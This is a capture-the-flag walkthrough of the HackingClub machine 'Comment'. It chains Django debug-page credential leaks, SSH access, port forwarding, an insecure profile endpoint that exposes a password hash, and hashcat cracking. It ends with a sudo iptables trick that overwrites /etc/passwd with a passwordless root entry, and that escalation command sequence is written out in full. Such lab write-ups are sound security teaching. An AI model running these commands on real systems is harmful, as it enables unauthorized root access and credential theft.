---
title: Comment
categories: [HackingClub]
tags: [nmap, django, debug, hashcracking, portforward, iptables]
media_subpath: /images/hackingclub_comment/
image:
  path: 'https://hackingclub-statics.s3.amazonaws.com/machine/thumbnails/193513810468683222b210e0.47579027'
---

## Summary
**Comment** is a Easy-rated HackingClub machine that demonstrates an attack chain involving web application vulnerabilities, credential discovery, and privilege escalation through system administration tools. The attack begins with exploiting Django debug mode to discover application endpoints and credentials, followed by lateral movement through SSH access. After discovering internal services through port forwarding, we exploit a web application to extract user credentials and crack password hashes. Finally, we exploit sudo privileges with iptables to achieve root access by manipulating system files through firewall rule injection.

## Nmap Scan

We start our enumeration of the given IP Address by running an `nmap` scan

```shell
nmap -sVC -Pn -oN nmap -vv $IP
```
> Command breakdown:
- `nmap` : This command is used to run the nmap tool.
- `-sVC` : This flag is the combination of the `-sV` and `-sC` flags, which specifies that we want to run a service version scan and a script scan, respectively.
- `-Pn` : Treat all hosts as online
- `-oN` : Output to a file in normal nmap format
- `-vv` : Very verbose output
{: .prompt-info}

### Relevant Ports
```
22/tcp   open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
8080/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

## 8000 - Web Application

The web application on port 8000 presents an "SSH Key Security Checker" application.

![SSH Key Security Checker](file-20251007164224174.png)

### Django Debug Mode Discovery

When we enter a random non-existing directory, we encounter a Django debug mode configuration that reveals the application's URL structure:

![Django Debug Mode](file-20251007212405044.png)

The debug page reveals several important endpoints:
- `/admin/` - Django admin interface
- `/login/` - User login endpoint

> Django debug mode is extremely dangerous in production environments as it exposes sensitive information about the application structure, database queries, and error details.
{: .prompt-warning}

### Login Endpoint Analysis

Accessing the `/login` endpoint reveals a detailed error stacktrace:

![Login Error Stacktrace](file-20251007202221430.png)

By examining the source code in the error page, we can discover hardcoded credentials:

![Hardcoded Credentials](file-20251007202308972.png)

The credentials found are for the admin user, but these don't work on the server, suggesting they might be for a different service or environment.

## 8080 - Web Application

The web application on port 8080 also shows a Django installation with debug mode enabled:

![Django Installation](file-20251007164249743.png)

### Admin Interface Access

There's also an `/admin` endpoint. When accessing it, we can login using the credentials found earlier:

![Admin Login](file-20251007202552680.png)

### User Information Discovery

Looking at the users in the admin interface, we can see a description for the `alicerso` user:

![User Description](file-20251007202753176.png)

The description reveals: "to log in to user alicerso, use 'mahelkita' password"

### SSH Access

With the discovered credentials, we can access the machine via SSH:

![SSH Access](file-20251007202745192.png)

```bash
ssh alicerso@172.16.10.173
# Password: mahelkita
```

## Lateral Movement

### User Enumeration

After gaining SSH access, we can see there's a `william` user on the system. By checking processes running under that user, we discover a Python server running on `127.0.0.1:3000`:

![Process Enumeration](file-20251007203351680.png)

```bash
ps aux | grep william
```

> The `william` user is hosting a Python server on localhost port 3000, which suggests there's an internal web application that we need to access.
{: .prompt-info}

### Port Forwarding Setup

We need to forward the internal port 3000 to our local machine using SSH port forwarding. First, we need to enable SSH command line escape sequences:

**Method 1: Using SSH command line option**
```bash
ssh -o "EnableEscapeCommandline=yes" alicerso@172.16.10.173
```

**Method 2: Adding to SSH config**
```bash
echo "EnableEscapeCommandline yes" >> ~/.ssh/config
```

Once connected, we can use the SSH escape sequence to set up port forwarding:

![SSH Port Forwarding](file-20251007203028814.png)

```bash
# Press Ctrl+~ then C to open SSH command line
ssh> -L 3000:127.0.0.1:3000
Forwarding port.
```

> Command breakdown:
- `-L 3000:127.0.0.1:3000` : Forward local port 3000 to remote 127.0.0.1:3000
- This allows us to access the internal service running on the target machine
{: .prompt-info}

## Internal Web Application

### Application Discovery

By accessing the forwarded port, we can see a login and register page:

![Internal Application](file-20251007212908577.png)

After registering and logging in with our account, we can access the application.

### Profile Analysis

By analyzing the network traffic when accessing the profile, we discover a request to `profile/3`:

![Profile Request](file-20251007211031683.png)

### User Information Extraction

Checking these requests reveals information about users in the system:

![User Information](file-20251007211108672.png)

Looking at user ID 2, we can see it belongs to the `william` user:

![William User Info](file-20251007211125527.png)

The response contains a password hash:
```json
{"id":2,"username":"william","email":"william@comment.hc","password":"pbkdf2_sha256$1000$X2FdMFnlpm25NqFaiWifvM$aRnhZH9Qy9sTsAnm7bMRM7X+OrsTu1gMfw5e00vXtdg="}
```

### Password Hash Cracking

We can crack this PBKDF2 hash using `hashcat`:

![Hash Cracking](file-20251007211203844.png)

```bash
hashcat -m 10000 hash.txt /usr/share/wordlists/rockyou.txt
```

> Command breakdown:
- `-m 10000` : PBKDF2-SHA256 hash mode
- `hash.txt` : File containing the hash
- `/usr/share/wordlists/rockyou.txt` : Wordlist for cracking
{: .prompt-info}

## Privilege Escalation

### User Switching

After cracking the password, we can switch to the `william` user:

```bash
su william
# Enter the cracked password
```

### Sudo Privileges Analysis

Checking `william`'s sudo privileges reveals he can run `iptables` and `iptables-save` as root:

```bash
william@ip-172-16-10-173:~$ sudo -l
[sudo] password for william:
Matching Defaults entries for william on
    ip-172-16-10-173:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User william may run the following commands on
        ip-172-16-10-173:
    (ALL : ALL) /usr/sbin/iptables
    (ALL : ALL) /usr/sbin/iptables-save
```

> The user `william` has sudo privileges to run `iptables` and `iptables-save` as root. This is dangerous because these commands can be used to manipulate system files through firewall rule injection.
{: .prompt-warning}

### Iptables Privilege Escalation

Following the privilege escalation technique from [Shielder's blog](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/), we can exploit this to gain root access.

#### Understanding the Attack

The attack works by:
1. **Creating a malicious iptables rule** with a comment containing our payload
2. **Using iptables-save** to write the rules to a file
3. **Overwriting system files** like `/etc/passwd` with our malicious content

#### Step 1: Create Malicious Iptables Rule

```bash
william@ip-172-16-10-173:~$ sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nroot::0:0:root:/root:/bin/bash\n'
```

> Command breakdown:
- `sudo iptables -A INPUT` : Add a rule to the INPUT chain
- `-i lo` : Match traffic on loopback interface
- `-j ACCEPT` : Accept the traffic
- `-m comment --comment` : Add a comment to the rule
- `$'\nroot::0:0:root:/root:/bin/bash\n'` : The malicious payload (newline + root entry with empty password + newline)
{: .prompt-info}

#### Step 2: Verify the Rule

```bash
william@ip-172-16-10-173:~$ sudo iptables -S
-P INPUT ACCEPT
-P FORWARD ACCEPT
-P OUTPUT ACCEPT
-A INPUT -i lo -m comment --comment "
root::0:0:root:/root:/bin/bash
" -j ACCEPT
```

The rule is successfully created with our malicious comment.

#### Step 3: Save Rules to System File

```bash
william@ip-172-16-10-173:~$ sudo iptables-save -f /etc/passwd
```

> Command breakdown:
- `sudo iptables-save` : Save current iptables rules
- `-f /etc/passwd` : Write output to `/etc/passwd` file
- This overwrites the passwd file with our malicious content
{: .prompt-info}

#### Step 4: Verify File Overwrite

```bash
william@ip-172-16-10-173:~$ cat /etc/passwd
# Generated by iptables-save v1.8.10 (nf_tables) on Tue Oct  7 21:07:51 2025
*filter
:INPUT ACCEPT [654:57118]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -i lo -m comment --comment "
root::0:0:root:/root:/bin/bash
" -j ACCEPT
COMMIT
# Completed on Tue Oct  7 21:07:51 2025
```

The `/etc/passwd` file has been overwritten with iptables output, but our malicious root entry is embedded in the comment.

#### Step 5: Switch to Root

```bash
william@ip-172-16-10-173:~$ su root
root@ip-172-16-10-173:/home/william# cd /root
root@ip-172-16-10-173:~#
```

## Conclusion

### Quick Recap
- The machine was compromised through Django debug mode exploitation
- Hardcoded credentials were discovered in error messages
- SSH access was gained using discovered credentials
- Internal services were accessed through SSH port forwarding
- User credentials were extracted from the internal web application
- Password hashes were cracked to gain access to another user
- Sudo privileges with iptables were exploited to achieve root access

### Lessons Learned
- **Debug Mode Security**: Never enable debug mode in production environments
- **Credential Management**: Never hardcode credentials in source code or error messages
- **Password Security**: Use strong, unique passwords and proper hashing
- **Sudo Privileges**: Limit sudo access to only necessary commands
